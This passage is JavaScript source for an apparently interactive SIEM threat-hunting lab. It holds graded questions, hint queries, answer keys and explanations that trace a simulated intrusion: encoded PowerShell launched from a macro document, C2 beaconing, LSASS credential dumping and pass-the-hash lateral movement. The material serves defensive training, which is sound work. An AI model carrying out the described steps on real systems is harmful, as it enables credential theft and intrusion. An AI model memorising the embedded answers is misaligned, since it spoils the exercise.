            res = Object.assign({}, res, { rows, columns: cols });
            break;
          }
          default: throw new QErr(`Unknown command "${name}". Supported: ${COMMANDS.join(", ")}.`);
        }
      }
      return res;
    }

    // ======================= QUESTIONS =======================
    const Q = [
      { q: "Which host opened a document that spawned encoded PowerShell? (Word should never be the parent of PowerShell.)",
        a: [VIC.host], hint: "index=sysmon EventCode=1 ParentImage=*WINWORD.EXE | table _time, host, User, Image, CommandLine",
        why: `${VIC.host}: WINWORD.EXE spawned powershell.exe -nop -w hidden -enc ... (T1566.001 Spearphishing Attachment -> T1059.001 PowerShell). Decoding the base64 (UTF-16LE) shows a download of updater.exe from ${C2}.` },
      { q: "What is the file name of the malicious document?",
        a: [DOC, "c:\\users\\dmorgan\\downloads\\" + DOC.toLowerCase()], hint: "index=sysmon host=" + VIC.host + " EventCode=11 OR Image=*WINWORD.EXE | table _time, EventCode, Image, TargetFilename, CommandLine",
        why: `${DOC} - a macro-enabled (.docm) "invoice", downloaded by Chrome from ${LURE} at 09:14 and opened in Word two minutes later.` },
      { q: "Which domain is the C2 (command-and-control) server? Look for a rare domain contacted by only one host, but very often.",
        a: [C2], hint: "index=proxy | stats count, dc(src_ip) as hosts by dest_domain | sort -count",
        why: `${C2} was contacted by a single internal IP (${VIC.ip}) roughly every 60 seconds with small, uniform POSTs - classic beaconing (T1071.001 Web Protocols). recipes.example.net is also rare but was a single normal visit.` },
      { q: `How many proxy requests in total did ${VIC.host} (${VIC.ip}) make to the C2 domain?`,
        a: [String(C2_COUNT)], hint: "index=proxy src_ip=" + VIC.ip + " | stats count by dest_domain | sort -count",
        why: `${C2_COUNT} requests: 1 GET for the second-stage payload (/a, ~900 KB) followed by ${beacons} small POST beacons. Uniform size and timing (60s +/- jitter) is how you tell beacons from human browsing.` },
      { q: "Which process image accessed lsass.exe in a way consistent with credential dumping? (give the file name)",
        a: ["updater.exe", DROP.toLowerCase()], hint: "index=sysmon EventCode=10 TargetImage=*lsass.exe | stats count by SourceImage, GrantedAccess",
        why: `updater.exe (dropped by the PowerShell stager in %TEMP%) opened lsass with GrantedAccess 0x1010/0x1410 and dbghelp.dll in the call trace - a memory-dump pattern (T1003.001 LSASS Memory). Defender (MsMpEng.exe), svchost and wininit with 0x1000 are routine.` },
      { q: "Which account did the attacker use to move laterally to the servers?",
        a: ["svc_backup", "corp\\svc_backup"], hint: "index=wineventlog EventCode=4624 LogonType=3 IpAddress=" + VIC.ip + " | table _time, host, TargetUserName, AuthenticationPackageName",
        why: `svc_backup normally logs on only from BKP-01 (10.10.5.30) using Kerberos. After the lsass dump it logged on via NTLM (type 3) from ${VIC.host} to FS-01, SQL-02 and DC-01, with a preceding 4648 explicit-credential event (T1021.002 SMB/Admin Shares, T1550.002 Pass the Hash).` }
    ];

    // ======================= UI =======================
    const style = document.createElement("style");
    style.textContent = `
      .lab-lab-siem-hunt .sh-bar { display:flex; gap:8px; align-items:stretch; }
      .lab-lab-siem-hunt .sh-bar textarea { flex:1; min-height: 64px; font-family: var(--mono, monospace); resize: vertical; }
      .lab-lab-siem-hunt .sh-res { max-height: 440px; overflow:auto; border:1px solid var(--border); border-radius:8px; }
      .lab-lab-siem-hunt .sh-res table { width:100%; font-size:.82em; }
      .lab-lab-siem-hunt .sh-res th { position: sticky; top:0; background: var(--surface); text-align:left; }
      .lab-lab-siem-hunt .sh-res td { vertical-align: top; }
      .lab-lab-siem-hunt .sh-raw { white-space: pre-wrap; word-break: break-all; }
      .lab-lab-siem-hunt .sh-meta { display:flex; flex-wrap:wrap; gap:6px; align-items:center; font-size:.85em; }
      .lab-lab-siem-hunt .sh-q { padding:10px 12px; }
      .lab-lab-siem-hunt .sh-q .input { flex:1; min-width: 0; }
      .lab-lab-siem-hunt .sh-hint { margin-top:6px; font-size:.85em; }
      .lab-lab-siem-hunt .sh-fb { margin-top:6px; font-size:.9em; }
      .lab-lab-siem-hunt .sh-fieldbtn { cursor:pointer; }
      .lab-lab-siem-hunt .sh-layout { display:grid; grid-template-columns: minmax(0, 3fr) minmax(280px, 2fr); gap:16px; align-items:start; }
      @media (max-width: 1000px) { .lab-lab-siem-hunt .sh-layout { grid-template-columns: 1fr; } }
    `;
    container.appendChild(style);

    const idxCounts = {};
    E.forEach((e) => { idxCounts[e.index] = (idxCounts[e.index] || 0) + 1; });
    container.insertAdjacentHTML("beforeend", `
      <div class="sh-layout">
        <div class="stack">
          <div class="card stack">
            <div class="sh-meta muted">Time range: 2025-10-14 08:00-12:00 &middot; ${E.length} events &middot;
              ${Object.keys(idxCounts).sort().map((k) => `<span class="tag sh-fieldbtn" data-idx="${esc(k)}" title="Search this index">index=${esc(k)} (${idxCounts[k]})</span>`).join(" ")}</div>
            <div class="sh-bar">
              <textarea class="textarea mono" data-el="q" spellcheck="false" aria-label="Search query">index=proxy | stats count by dest_domain | sort -count</textarea>
              <button class="btn primary" data-el="run" type="button">Search</button>
            </div>
            <div class="muted" style="font-size:.8em">Ctrl+Enter (or Enter) to run &middot; Shift+Enter for a new line &middot; field names are case-insensitive, values match case-insensitively with * wildcards.</div>
            <div data-el="status"></div>
            <div data-el="fields" class="sh-meta"></div>
            <div class="sh-res" data-el="res"></div>
          </div>
        </div>
        <div class="stack">
          <h3 style="margin:0">Hunting questions</h3>
          <div class="stack" data-el="qs"></div>
          <div class="row"><button class="btn primary" data-el="check" type="button">Check answers</button></div>
          <div data-el="result"></div>
        </div>
      </div>`);
    const $ = (s) => container.querySelector(`[data-el="${s}"]`);
    const qEl = $("q");
    const savedQ = ctx.store("lastQuery");
    if (typeof savedQ === "string" && savedQ) qEl.value = savedQ;

    function show() {
      const q = qEl.value;
      let res;
      try { res = runQuery(q); }
      catch (e) {
        const msg = e instanceof QErr ? e.message : "Unexpected error: " + e.message;
        $("status").innerHTML = `<div class="alert bad"><b>Search error:</b> ${esc(msg)}</div>`;
        $("res").innerHTML = ""; $("fields").innerHTML = "";
        return;
      }
      try { ctx.store("lastQuery", q); } catch (e) { /* ignore */ }
      const n = res.rows.length;
      $("status").innerHTML = `<div class="muted">${n} ${res.isEvents ? "event" : "result"}${n === 1 ? "" : "s"}${n > 300 ? " (showing first 300)" : ""}</div>`;
      const rows = res.rows.slice(0, 300);
      if (res.isEvents) {
        const fc = {};
        res.rows.forEach((r) => Object.keys(r).forEach((k) => { if (!HIDDEN.has(k) && k !== "_time") fc[k] = (fc[k] || 0) + 1; }));
        $("fields").innerHTML = n ? `<span class="muted">Fields (click for | stats count by):</span> ` + Object.keys(fc).sort().map((k) => `<span class="tag sh-fieldbtn" data-field="${esc(k)}">${esc(k)}</span>`).join(" ") : "";
        $("res").innerHTML = n ? `<table class="table"><thead><tr><th>_time</th><th>index</th><th>_raw</th></tr></thead><tbody>${rows.map((r) => `<tr><td class="mono" style="white-space:nowrap">${esc(r._time)}</td><td>${esc(r.index)}</td><td class="mono sh-raw">${esc(r._raw)}</td></tr>`).join("")}</tbody></table>`
          : `<div class="alert info" style="margin:8px">No events matched. Check field names (click an index tag to explore its fields) and wildcards.</div>`;
      } else {
        $("fields").innerHTML = "";
        const cols = res.columns || defaultCols(rows);
        $("res").innerHTML = n ? `<table class="table"><thead><tr>${cols.map((c) => `<th>${esc(c)}</th>`).join("")}</tr></thead><tbody>${rows.map((r) => `<tr>${cols.map((c) => { const v = getField(r, c); return `<td class="mono sh-raw">${esc(v === undefined ? "" : String(v))}</td>`; }).join("")}</tr>`).join("")}</tbody></table>`
          : `<div class="alert info" style="margin:8px">No results.</div>`;
      }
    }
    $("run").addEventListener("click", show);
    qEl.addEventListener("keydown", (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); show(); } });
    container.addEventListener("click", (e) => {
      const f = e.target.closest("[data-field]");
      if (f) { const base = qEl.value.split("|")[0].trim(); qEl.value = `${base} | stats count by ${f.dataset.field} | sort -count`; show(); return; }
      const ix = e.target.closest("[data-idx]");
      if (ix) { qEl.value = `index=${ix.dataset.idx} | head 20`; show(); }
    });
    show();

    const qs = $("qs");
    Q.forEach((q, i) => {
      const d = document.createElement("div");
      d.className = "card sh-q";
      d.innerHTML = `<div><b>${i + 1}.</b> ${esc(q.q)}</div>
        <div class="row" style="margin-top:6px"><input class="input mono" data-a="${i}" placeholder="answer"><button class="btn ghost" type="button" data-hint="${i}">Hint</button></div>
        <div class="sh-hint" data-hinttext="${i}" hidden><div class="mono" style="word-break:break-all">${esc(q.hint)}</div><button class="btn ghost" type="button" data-use="${i}" style="margin-top:4px">Load query</button></div>
        <div class="sh-fb" data-fb="${i}"></div>`;
      qs.appendChild(d);
    });
    qs.addEventListener("click", (e) => {
      const h = e.target.closest("[data-hint]");
      if (h) { const el = qs.querySelector(`[data-hinttext="${h.dataset.hint}"]`); el.hidden = !el.hidden; }
      const u = e.target.closest("[data-use]");
      if (u) { qEl.value = Q[+u.dataset.use].hint; show(); qEl.focus(); }
    });
    const norm = (s) => String(s).trim().toLowerCase().replace(/^["']|["']$/g, "");
    let done = false;
    $("check").addEventListener("click", () => {
      let correct = 0, answered = 0;
      Q.forEach((q, i) => {
        const v = qs.querySelector(`[data-a="${i}"]`).value;
        const fb = qs.querySelector(`[data-fb="${i}"]`);
        if (!v.trim()) { fb.innerHTML = `<span class="tag warn">not answered</span>`; return; }
        answered++;
        const ok = q.a.map(norm).includes(norm(v));
        if (ok) correct++;
        fb.innerHTML = `<span class="tag ${ok ? "good" : "bad"}">${ok ? "Correct" : "Not quite"}</span> ${ok ? esc(q.why) : "Refine your query and try again."}`;
      });
      if (answered < Q.length) { $("result").innerHTML = `<div class="alert info">${correct}/${answered} correct so far. Answer all ${Q.length} to finish the hunt.</div>`; return; }
      const score = Math.round(correct / Q.length * 100);
      Q.forEach((q, i) => { const fb = qs.querySelector(`[data-fb="${i}"]`); if (!fb.innerHTML.includes("Correct")) fb.innerHTML = `<span class="tag bad">Not quite</span> Answer: <b class="mono">${esc(q.a[0])}</b> - ${esc(q.why)}`; });
      $("result").innerHTML = `<div class="alert ${score >= 70 ? "good" : "bad"}"><b>Score: ${score}%</b> (${correct}/${Q.length})
        <div style="margin-top:6px"><b>Reconstructed chain:</b> 09:14 ${esc(DOC)} downloaded from ${esc(LURE)} &rarr; 09:16 Word spawns encoded PowerShell &rarr;
        updater.exe downloaded from ${esc(C2)} &rarr; 60-second beaconing &rarr; 09:42 lsass access (credential dumping) &rarr; 09:58 svc_backup NTLM network logons to FS-01, SQL-02, DC-01.
        <br><b>Detections to build:</b> Office app spawning a script interpreter; rare domain with periodic connections from one host; non-allow-listed process opening lsass; service account logging on from an unexpected source.</div></div>`;
      if (!done) { done = true; ctx.complete(score); }
    });

    container._cpQuery = (q) => { try { const r = runQuery(q); return { n: r.rows.length, rows: r.rows.slice(0, 50).map((x) => { const o = Object.assign({}, x); delete o._raw; delete o._t; return o; }), columns: r.columns }; } catch (e) { return { error: e.message, isQErr: e instanceof QErr }; } };
    container._cpAnswers = Q.map((q) => q.a[0]);
  }
});
